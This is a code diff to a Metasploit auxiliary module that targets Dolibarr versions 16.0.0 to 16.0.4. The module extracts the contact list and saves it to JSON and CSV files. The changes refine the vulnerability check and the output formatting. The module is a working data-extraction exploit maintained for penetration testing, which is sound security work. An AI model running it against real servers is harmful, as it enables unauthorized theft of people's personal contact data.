@@ -38,13 +38,13 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://github.com/Dolibarr/dolibarr/commit/be82f51f68d738cce205f4ce5b469ef42ed82d9e']
         ],
         'DefaultOptions' => {
-          'HttpClientTimeout' => 20
+          'HttpClientTimeout' => 20,
+          'RPORT' => 80
         }
       )
     )
     register_options(
       [
-        Opt::RPORT(80),
         OptString.new('TARGETURI', [true, 'Path to Dolibarr instance', '/'])
       ]
     )
@@ -56,11 +56,17 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path)
     })
     return Exploit::CheckCode::Unknown('Connection failed') unless res
-    return Exploit::CheckCode::Safe('Target did not return HTTP 200') unless res.code == 200
+    return Exploit::CheckCode::Unknown("Dolibarr check returned HTTP #{res.code}") unless res.code == 200
 
-    version = res.body.scan(/Dolibarr ([\d.]+-*[a-zA-Z0-9]*)/).flatten.first
+    version = res.body.to_s.scan(/Dolibarr ([\d.]+-*[a-zA-Z0-9]*)/).flatten.first
 
-    return Exploit::CheckCode::Detected('Dolibarr version not found - proceeding anyway...') if version.blank?
+    if version.blank?
+      unless res.get_html_document.at_css('meta[name="author"][content="Dolibarr Development Team"]')
+        return Exploit::CheckCode::Unknown('Response did not identify Dolibarr')
+      end
+
+      return Exploit::CheckCode::Detected('Dolibarr detected, but its version is unavailable')
+    end
 
     if Rex::Version.new(version).between?(Rex::Version.new('16.0.0'), Rex::Version.new('16.0.4'))
       return Exploit::CheckCode::Appears("Detected vulnerable Dolibarr version: #{version}")
@@ -108,14 +114,14 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     print_good("Found #{nbr_contact} contacts.")
-    print_good("#{Rex::Socket.to_authority(rhost, rport)} - File saved in: #{path_json_file}")
+    print_good("File saved in: #{path_json_file}")
 
     csv_string = CSV.generate do |csv| # Loop to write into csv
       csv << contact_fields
       contacts.each do |contact|
         csv << contact_fields.map do |element|
           if contact[element.to_s].is_a?(String) || contact[element.to_s].is_a?(Integer)
-            contact[element.to_s]&.to_s&.strip || ''
+            contact[element.to_s].to_s
           else
             ''
           end
@@ -131,7 +137,7 @@ class MetasploitModule < Msf::Auxiliary
       '.csv'
     )
 
-    print_good("#{Rex::Socket.to_authority(rhost, rport)} - File saved in: #{path_csv_file}")
+    print_good("File saved in: #{path_csv_file}")
   end
 
 end
